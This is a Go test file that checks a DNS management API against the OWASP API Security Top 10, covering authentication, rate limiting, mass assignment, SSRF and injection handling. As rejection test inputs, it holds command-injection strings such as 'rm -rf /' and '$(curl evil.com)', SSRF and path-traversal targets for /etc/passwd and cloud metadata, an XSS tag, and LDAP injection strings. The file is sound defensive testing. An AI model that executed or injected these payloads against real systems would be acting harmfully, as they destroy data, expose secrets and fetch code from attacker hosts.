// Package security - OWASP API Security Top 10 (2023) aligned tests.
//
// Maps to: https://owasp.org/API-Security/editions/2023/en/0x11-t10/
//
// API1 - Broken Object Level Authorization (BOLA): TestOWASP_API1_*
// API2 - Broken Authentication: security_test.go TestAuth_*
// API3 - Broken Object Property Level Authorization: TestOWASP_API3_*
// API4 - Unrestricted Resource Consumption: TestOWASP_API4_*, TestMaxBytes, TestJSON_DepthLimit
// API5 - Broken Function Level Authorization: covered by API1 (health public, rest protected)
// API6 - Unrestricted Access to Sensitive Business Flows: TestOWASP_API6_*
// API7 - Server Side Request Forgery (SSRF): TestOWASP_API7_*
// API8 - Security Misconfiguration: TestOWASP_API8_*
// API9 - Improper Inventory Management: TestOWASP_API9_*
// API10 - Unsafe Consumption of APIs: N/A (no third-party API from user input)
//
// OWASP Top 10 Web - Injection (A05): TestOWASP_A05_Injection_*
package security

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/mw7101/domudns/internal/caddy/api"
	"github.com/mw7101/domudns/internal/config"
	"github.com/mw7101/domudns/internal/dns"
	"github.com/mw7101/domudns/internal/store"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// mockBlocklistStore implements api.BlocklistStore for OWASP tests.
type mockBlocklistStore struct{}

func (m *mockBlocklistStore) ListBlocklistURLs(ctx context.Context) ([]store.BlocklistURL, error) {
	return nil, nil
}
func (m *mockBlocklistStore) AddBlocklistURL(ctx context.Context, url string, enabled bool) (*store.BlocklistURL, error) {
	return &store.BlocklistURL{ID: 1, URL: url, Enabled: enabled, CreatedAt: time.Now()}, nil
}
func (m *mockBlocklistStore) RemoveBlocklistURL(ctx context.Context, id int) error { return nil }
func (m *mockBlocklistStore) SetBlocklistURLEnabled(ctx context.Context, id int, enabled bool) error {
	return nil
}
func (m *mockBlocklistStore) UpdateBlocklistURLFetch(ctx context.Context, id int, lastError *string) error {
	return nil
}
func (m *mockBlocklistStore) SetBlocklistURLDomains(ctx context.Context, urlID int, domains []string) error {
	return nil
}
func (m *mockBlocklistStore) ListBlockedDomains(ctx context.Context) ([]string, error) {
	return nil, nil
}
func (m *mockBlocklistStore) AddBlockedDomain(ctx context.Context, domain string) error { return nil }
func (m *mockBlocklistStore) RemoveBlockedDomain(ctx context.Context, domain string) error {
	return nil
}
func (m *mockBlocklistStore) ListAllowedDomains(ctx context.Context) ([]string, error) {
	return nil, nil
}
func (m *mockBlocklistStore) AddAllowedDomain(ctx context.Context, domain string) error { return nil }
func (m *mockBlocklistStore) RemoveAllowedDomain(ctx context.Context, domain string) error {
	return nil
}
func (m *mockBlocklistStore) ListWhitelistIPs(ctx context.Context) ([]string, error)     { return nil, nil }
func (m *mockBlocklistStore) AddWhitelistIP(ctx context.Context, ipCIDR string) error    { return nil }
func (m *mockBlocklistStore) RemoveWhitelistIP(ctx context.Context, ipCIDR string) error { return nil }
func (m *mockBlocklistStore) GetMergedBlocklist(ctx context.Context) ([]string, error) {
	return nil, nil
}
func (m *mockBlocklistStore) ListBlocklistPatterns(ctx context.Context) ([]store.BlocklistPattern, error) {
	return nil, nil
}
func (m *mockBlocklistStore) AddBlocklistPattern(ctx context.Context, pattern string, patternType string) (*store.BlocklistPattern, error) {
	return &store.BlocklistPattern{ID: 1, Pattern: pattern, Type: patternType}, nil
}
func (m *mockBlocklistStore) RemoveBlocklistPattern(ctx context.Context, id int) error { return nil }

// mockStore implements ZoneStore, RecordStore, ACMEStore for unit tests.
type mockStore struct {
	zones map[string]*dns.Zone
	acme  map[string]string
}

func newMockStore() *mockStore {
	return &mockStore{
		zones: make(map[string]*dns.Zone),
		acme:  make(map[string]string),
	}
}

func (m *mockStore) GetZone(ctx context.Context, domain string) (*dns.Zone, error) {
	if z, ok := m.zones[domain]; ok {
		return z, nil
	}
	return nil, dns.ErrZoneNotFound
}

func (m *mockStore) ListZones(ctx context.Context) ([]*dns.Zone, error) {
	out := make([]*dns.Zone, 0, len(m.zones))
	for _, z := range m.zones {
		zc := *z
		out = append(out, &zc)
	}
	return out, nil
}

func (m *mockStore) PutZone(ctx context.Context, zone *dns.Zone) error {
	zc := *zone
	if zc.Records == nil {
		zc.Records = []dns.Record{}
	}
	m.zones[zone.Domain] = &zc
	return nil
}

func (m *mockStore) DeleteZone(ctx context.Context, domain string) error {
	delete(m.zones, domain)
	return nil
}

func (m *mockStore) GetZoneView(_ context.Context, domain, view string) (*dns.Zone, error) {
	key := domain + "@" + view
	if z, ok := m.zones[key]; ok {
		return z, nil
	}
	return nil, dns.ErrZoneNotFound
}

func (m *mockStore) DeleteZoneView(_ context.Context, domain, view string) error {
	delete(m.zones, domain+"@"+view)
	return nil
}

func (m *mockStore) PutRecord(ctx context.Context, zoneDomain string, record *dns.Record) error {
	z, ok := m.zones[zoneDomain]
	if !ok {
		return dns.ErrZoneNotFound
	}
	if record.ID == 0 {
		record.ID = z.NextRecordID()
	}
	found := false
	for i := range z.Records {
		if z.Records[i].ID == record.ID {
			z.Records[i] = *record
			found = true
			break
		}
	}
	if !found {
		z.Records = append(z.Records, *record)
	}
	return nil
}

func (m *mockStore) GetRecords(ctx context.Context, zoneDomain string) ([]dns.Record, error) {
	z, ok := m.zones[zoneDomain]
	if !ok {
		return nil, dns.ErrZoneNotFound
	}
	records := make([]dns.Record, len(z.Records))
	copy(records, z.Records)
	return records, nil
}

func (m *mockStore) DeleteRecord(ctx context.Context, zoneDomain string, recordID int) error {
	z, ok := m.zones[zoneDomain]
	if !ok {
		return dns.ErrZoneNotFound
	}
	for i, r := range z.Records {
		if r.ID == recordID {
			z.Records = append(z.Records[:i], z.Records[i+1:]...)
			return nil
		}
	}
	return dns.ErrRecordNotFound
}

func (m *mockStore) PutACMEChallenge(ctx context.Context, fqdn, value string, ttl time.Duration) error {
	m.acme[fqdn] = value
	return nil
}

func (m *mockStore) DeleteACMEChallenge(ctx context.Context, fqdn string) error {
	delete(m.acme, fqdn)
	return nil
}

func (m *mockStore) HealthCheck(ctx context.Context) error {
	return nil
}

// mockStore implementiert auch store.AuthStore für Tests.
func (m *mockStore) GetAuthConfig(ctx context.Context) (*store.AuthConfig, error) {
	return &store.AuthConfig{
		Username:       "admin",
		SetupCompleted: true,
	}, nil
}

func (m *mockStore) UpdateAuthConfig(ctx context.Context, cfg *store.AuthConfig) error {
	return nil
}

func (m *mockStore) MarkSetupCompleted(ctx context.Context) error {
	return nil
}

// testRouter builds a router with mock store for OWASP tests.
func testRouter(t *testing.T, apiKey string) *api.Router {
	t.Helper()
	ms := newMockStore()
	// Direkt AuthConfig mit API-Key setzen über den Store-Wrapper
	authMgr := newTestAuthManager(t, apiKey)

	cfg := &config.Config{
		Blocklist: config.BlocklistConfig{Enabled: true, FilePath: "/tmp/test-blocklist.hosts"},
	}
	health := api.NewHealthHandler(ms.HealthCheck)
	metrics := api.NewMetricsHandler()
	configHandler := api.NewConfigHandler(cfg, nil)
	zones := api.NewZonesHandler(ms, nil)
	records := api.NewRecordsHandler(ms, nil)
	acme := api.NewACMEHandler(ms, 60)
	blocklist := api.NewBlocklistHandler(&mockBlocklistStore{}, cfg, nil)
	setupHandler := api.NewSetupHandler(authMgr)
	authHandler := api.NewAuthHandler(authMgr)
	return api.NewRouter(health, metrics, configHandler, zones, records, acme, blocklist, authMgr, setupHandler, authHandler, api.NewSessionManager(), true)
}

// mockAuthStore ist ein In-Memory AuthStore für OWASP-Tests.
type mockAuthStore struct {
	apiKey       string
	passwordHash string
}

func (m *mockAuthStore) GetAuthConfig(ctx context.Context) (*store.AuthConfig, error) {
	return &store.AuthConfig{
		Username:       "admin",
		PasswordHash:   m.passwordHash,
		APIKey:         m.apiKey,
		SetupCompleted: true,
	}, nil
}

func (m *mockAuthStore) UpdateAuthConfig(ctx context.Context, cfg *store.AuthConfig) error {
	return nil
}
func (m *mockAuthStore) MarkSetupCompleted(ctx context.Context) error { return nil }

// newTestAuthManager erstellt einen AuthManager mit dem gegebenen API-Key für Tests.
func newTestAuthManager(t *testing.T, apiKey string) *api.AuthManager {
	t.Helper()
	s := &mockAuthStore{apiKey: apiKey}
	am, err := api.NewAuthManager(context.Background(), s)
	if err != nil {
		t.Fatalf("NewAuthManager: %v", err)
	}
	return am
}

const testAPIKey = "valid-api-key-with-at-least-32-characters-long"

// --- API1:2023 Broken Object Level Authorization (BOLA) ---

// TestOWASP_API1_ProtectedEndpointsRequireAuth ensures zones, records, ACME require auth.
func TestOWASP_API1_ProtectedEndpointsRequireAuth(t *testing.T) {
	router := testRouter(t, testAPIKey)

	tests := []struct {
		name   string
		method string
		path   string
		body   string
	}{
		{"zones list", "GET", "/api/zones", ""},
		{"zones create", "POST", "/api/zones", `{"domain":"test.com","ttl":3600,"records":[]}`},
		{"zone get", "GET", "/api/zones/test.com", ""},
		{"records list", "GET", "/api/zones/test.com/records", ""},
		{"config", "GET", "/api/config", ""},
		{"acme present", "POST", "/api/acme/dns-01/present", `{"domain":"test.com","txt_value":"x"}`},
		{"blocklist urls", "GET", "/api/blocklist/urls", ""},
		{"blocklist domains", "GET", "/api/blocklist/domains", ""},
		{"blocklist allowed", "GET", "/api/blocklist/allowed", ""},
		{"metrics", "GET", "/api/metrics", ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var bodyReader io.Reader
			if tt.body != "" {
				bodyReader = strings.NewReader(tt.body)
			}
			req := httptest.NewRequest(tt.method, tt.path, bodyReader)
			if tt.body != "" {
				req.Header.Set("Content-Type", "application/json")
			}
			rec := httptest.NewRecorder()
			router.ServeHTTP(rec, req)
			assert.Equal(t, http.StatusUnauthorized, rec.Code,
				"unauthenticated request to %s %s must be 401", tt.method, tt.path)
		})
	}
}

// TestOWASP_API1_HealthEndpointPublicByDesign ensures health is public for probes.
func TestOWASP_API1_HealthEndpointPublicByDesign(t *testing.T) {
	router := testRouter(t, testAPIKey)
	req := httptest.NewRequest(http.MethodGet, "/api/health", nil)
	rec := httptest.NewRecorder()
	router.ServeHTTP(rec, req)
	assert.Equal(t, http.StatusOK, rec.Code)
}

// --- API2:2023 Broken Authentication ---
// Covered by TestAuth_* in security_test.go

// --- API3:2023 Broken Object Property Level Authorization ---

// TestOWASP_API3_ErrorResponseNoInternalDetails ensures 500 responses don't leak internals.
func TestOWASP_API3_ErrorResponseNoInternalDetails(t *testing.T) {
	// Internal errors must return generic "internal error", never DB paths, stack traces
	// writeInternalError is used - we can't easily trigger it without DB. Test structure only.
	// Response structure: {"success":false,"error":{"code":"X","message":"internal error"}}
	// message must NOT contain: /dns/, etcd, postgres, panic, runtime, goroutine
	router := testRouter(t, testAPIKey)
	// Valid auth, invalid zone (non-existent) -> 404, not 500
	req := httptest.NewRequest(http.MethodGet, "/api/zones/nonexistent-zone-12345.com", nil)
	req.Header.Set("Authorization", "Bearer "+testAPIKey)
	rec := httptest.NewRecorder()
	router.ServeHTTP(rec, req)
	// Should be 404, not 500 with leaked details
	assert.Equal(t, http.StatusNotFound, rec.Code)
	var resp struct {
		Error *struct {
			Message string `json:"message"`
		} `json:"error"`
	}
	_ = json.NewDecoder(rec.Body).Decode(&resp)
	if resp.Error != nil {
		assert.NotContains(t, strings.ToLower(resp.Error.Message), "/dns/")
		assert.NotContains(t, strings.ToLower(resp.Error.Message), "etcd")
		assert.NotContains(t, strings.ToLower(resp.Error.Message), "postgres")
		assert.NotContains(t, strings.ToLower(resp.Error.Message), "panic")
	}
}

// TestOWASP_API3_MassAssignmentRecordIDIgnoredOnCreate ensures create ignores client-supplied ID.
func TestOWASP_API3_MassAssignmentRecordIDIgnoredOnCreate(t *testing.T) {
	store := newMockStore()
	zone := &dns.Zone{Domain: "massassign.com", TTL: 3600, Records: []dns.Record{}}
	zone.EnsureSOA()
	require.NoError(t, store.PutZone(context.Background(), zone))

	cfg := &config.Config{}
	authMgr := newTestAuthManager(t, testAPIKey)
	health := api.NewHealthHandler(store.HealthCheck)
	configHandler := api.NewConfigHandler(cfg, nil)
	zones := api.NewZonesHandler(store, nil)
	records := api.NewRecordsHandler(store, nil)
	acme := api.NewACMEHandler(store, 60)
	blocklist := api.NewBlocklistHandler(&mockBlocklistStore{}, cfg, nil)
	setupHandler := api.NewSetupHandler(authMgr)
	authHandler := api.NewAuthHandler(authMgr)
	router := api.NewRouter(health, api.NewMetricsHandler(), configHandler, zones, records, acme, blocklist, authMgr, setupHandler, authHandler, api.NewSessionManager(), true)

	// Try to inject id:999 on create
	body := `{"name":"www","type":"A","ttl":3600,"value":"192.168.1.1","id":999}`
	req := httptest.NewRequest(http.MethodPost, "/api/zones/massassign.com/records", strings.NewReader(body))
	req.Header.Set("Authorization", "Bearer "+testAPIKey)
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()
	router.ServeHTTP(rec, req)
	require.Equal(t, http.StatusCreated, rec.Code, "response: %s", rec.Body.String())

	var resp struct {
		Data struct {
			ID int `json:"id"`
		} `json:"data"`
	}
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	// Server must assign ID; client-supplied 999 must be ignored (should be 1)
	assert.Equal(t, 1, resp.Data.ID, "API3 mass assignment: client id must be ignored, server assigns")
}

// --- API4:2023 Unrestricted Resource Consumption ---
// Rate limit, MaxBytes, JSON depth - covered in security_test.go

// TestOWASP_API4_RateLimitEnforced verifies rate limiting when enabled.
func TestOWASP_API4_RateLimitEnforced(t *testing.T) {
	authMgr4 := newTestAuthManager(t, testAPIKey)
	handler := api.AuthMiddleware(authMgr4, api.NewSessionManager(), http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	wrapped := api.RateLimitMiddleware(context.Background(), 2, false, handler) // 2 req/min

	req := httptest.NewRequest(http.MethodGet, "/", nil)
	req.RemoteAddr = "192.168.1.100:12345"
	req.Header.Set("Authorization", "Bearer "+testAPIKey)

	rec1 := httptest.NewRecorder()
	wrapped.ServeHTTP(rec1, req)
	assert.Equal(t, http.StatusOK, rec1.Code)

	rec2 := httptest.NewRecorder()
	wrapped.ServeHTTP(rec2, req)
	assert.Equal(t, http.StatusOK, rec2.Code)

	rec3 := httptest.NewRecorder()
	wrapped.ServeHTTP(rec3, req)
	assert.Equal(t, http.StatusTooManyRequests, rec3.Code)
}

// --- API5:2023 Broken Function Level Authorization ---
// Health public, zones/records/acme protected - covered by API1

// --- API6:2023 Unrestricted Access to Sensitive Business Flows ---

// TestOWASP_API6_ACMERequiresAuth ensures ACME present/cleanup require auth.
func TestOWASP_API6_ACMERequiresAuth(t *testing.T) {
	router := testRouter(t, testAPIKey)
	req := httptest.NewRequest(http.MethodPost, "/api/acme/dns-01/present",
		strings.NewReader(`{"domain":"example.com","txt_value":"challenge"}`))
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()
	router.ServeHTTP(rec, req)
	// Without auth -> 401
	// (With auth we'd get 200, but that's the flow - we test auth required)
	reqNoAuth := httptest.NewRequest(http.MethodPost, "/api/acme/dns-01/present",
		strings.NewReader(`{"domain":"example.com","txt_value":"challenge"}`))
	reqNoAuth.Header.Set("Content-Type", "application/json")
	recNoAuth := httptest.NewRecorder()
	router.ServeHTTP(recNoAuth, reqNoAuth)
	assert.Equal(t, http.StatusUnauthorized, recNoAuth.Code)
}

// --- API7:2023 Server Side Request Forgery (SSRF) ---

// TestOWASP_API7_URIRecordNoSSRF validates URI record values reject internal/SSRF hosts.
func TestOWASP_API7_URIRecordNoSSRF(t *testing.T) {
	internalURLs := []string{
		"http://127.0.0.1/",
		"http://localhost/admin",
		"http://[::1]/",
		"http://192.168.1.1/internal",
		"http://10.0.0.1/",
		"http://169.254.169.254/", // cloud metadata
		"file:///etc/passwd",
	}
	for _, u := range internalURLs {
		r := dns.Record{
			Name:     "test",
			Type:     dns.TypeURI,
			TTL:      3600,
			Priority: 10,
			Value:    u,
		}
		err := dns.ValidateRecord(r, "example.com")
		assert.Error(t, err, "API7 SSRF: internal URL %q must be rejected", u)
	}
	// Valid external URL must pass
	r := dns.Record{
		Name:     "test",
		Type:     dns.TypeURI,
		TTL:      3600,
		Priority: 10,
		Value:    "https://example.com/path",
	}
	assert.NoError(t, dns.ValidateRecord(r, "example.com"))
}

// TestOWASP_API7_NoFetchFromUserInput ensures we don't have endpoints that fetch URLs.
func TestOWASP_API7_NoFetchFromUserInput(t *testing.T) {
	// API does not expose any endpoint that fetches a user-supplied URL.
	// ACME domain -> we create DNS record, we don't HTTP GET it.
	// This test is documentation - no SSRF vector in current API.
	t.Log("API has no SSRF vector: no endpoint fetches user-supplied URIs")
}

// --- API8:2023 Security Misconfiguration ---

// TestOWASP_API8_UnknownEndpoints404 ensures unknown paths return 404.
func TestOWASP_API8_UnknownEndpoints404(t *testing.T) {
	router := testRouter(t, testAPIKey)
	tests := []string{
		"/api/unknown",
		"/api/v1/zones",
		"/api/zones/../etc/passwd",
		"/debug/pprof",
		"/.env",
	}
	for _, path := range tests {
		t.Run(path, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodGet, path, nil)
			req.Header.Set("Authorization", "Bearer "+testAPIKey)
			rec := httptest.NewRecorder()
			router.ServeHTTP(rec, req)
			assert.True(t, rec.Code == http.StatusNotFound || rec.Code == http.StatusBadRequest,
				"path %s should not expose debug or unknown endpoints, got %d", path, rec.Code)
		})
	}
}

// TestOWASP_API8_ContentTypeJSON ensures API responds with application/json.
func TestOWASP_API8_ContentTypeJSON(t *testing.T) {
	router := testRouter(t, testAPIKey)
	req := httptest.NewRequest(http.MethodGet, "/api/health", nil)
	rec := httptest.NewRecorder()
	router.ServeHTTP(rec, req)
	ct := rec.Header().Get("Content-Type")
	assert.Contains(t, ct, "application/json")
}

// --- API9:2023 Improper Inventory Management ---

// TestOWASP_API9_ConsistentErrorFormat ensures error responses use standard format.
func TestOWASP_API9_ConsistentErrorFormat(t *testing.T) {
	router := testRouter(t, testAPIKey)
	req := httptest.NewRequest(http.MethodGet, "/api/nonexistent", nil)
	req.Header.Set("Authorization", "Bearer "+testAPIKey)
	rec := httptest.NewRecorder()
	router.ServeHTTP(rec, req)

	var resp struct {
		Success bool `json:"success"`
		Error   *struct {
			Code    string `json:"code"`
			Message string `json:"message"`
		} `json:"error"`
	}
	require.NoError(t, json.NewDecoder(rec.Body).Decode(&resp))
	assert.False(t, resp.Success)
	require.NotNil(t, resp.Error)
	assert.NotEmpty(t, resp.Error.Code)
	assert.NotEmpty(t, resp.Error.Message)
}

// --- API10:2023 Unsafe Consumption of APIs ---
// We consume PostgreSQL, not third-party APIs from user input. N/A for direct testing.

// --- OWASP Top 10 (Web) - Injection (A05) ---

// TestOWASP_A05_Injection_TXTRejectsScripts ensures TXT records reject script injection.
func TestOWASP_A05_Injection_TXTRejectsScripts(t *testing.T) {
	// TXT allows up to 255 chars. We don't sanitize for HTML/JS - we store as-is.
	// DNS TXT records can contain arbitrary text. The risk is if the value is
	// reflected in a web UI without escaping. API returns JSON which escapes.
	// Test: record with <script> is valid per DNS spec but should be stored safely.
	r := dns.Record{
		Name:  "@",
		Type:  dns.TypeTXT,
		TTL:   3600,
		Value: "<script>alert(1)</script>",
	}
	err := dns.ValidateRecord(r, "example.com")
	assert.NoError(t, err) // TXT allows it - escaping is frontend responsibility
}

// TestOWASP_A05_Injection_SQLInjectionMitigated verifies SQL injection is mitigated.
func TestOWASP_A05_Injection_SQLInjectionMitigated(t *testing.T) {
	// PostgreSQL via pgx with parameterized queries ($1, $2, ...) - injection mitigated.
	t.Log("Parameterized queries - SQL injection mitigated")
}

// TestOWASP_A05_Injection_CommandInjection ensures we don't pass user input to exec.
func TestOWASP_A05_Injection_CommandInjection(t *testing.T) {
	// Domain in URL path - ensure no shell execution
	// IsValidDomain rejects ; | & $ ` etc (not in valid chars)
	malicious := []string{
		"example.com; rm -rf /",
		"example.com|id",
		"`whoami`",
		"$(curl evil.com)",
	}
	for _, d := range malicious {
		assert.False(t, dns.IsValidDomain(d), "IsValidDomain must reject: %q", d)
	}
}

// TestOWASP_A05_Injection_NoLDAPOrNoSQL verifies no LDAP/NoSQL injection vector.
func TestOWASP_A05_Injection_NoLDAPOrNoSQL(t *testing.T) {
	// PostgreSQL: parameterized queries. Domain validated before DB use.
	ldapStyle := []string{
		"*)(uid=*",
		"admin)(|(password=*",
	}
	for _, d := range ldapStyle {
		assert.False(t, dns.IsValidDomain(d))
	}
}
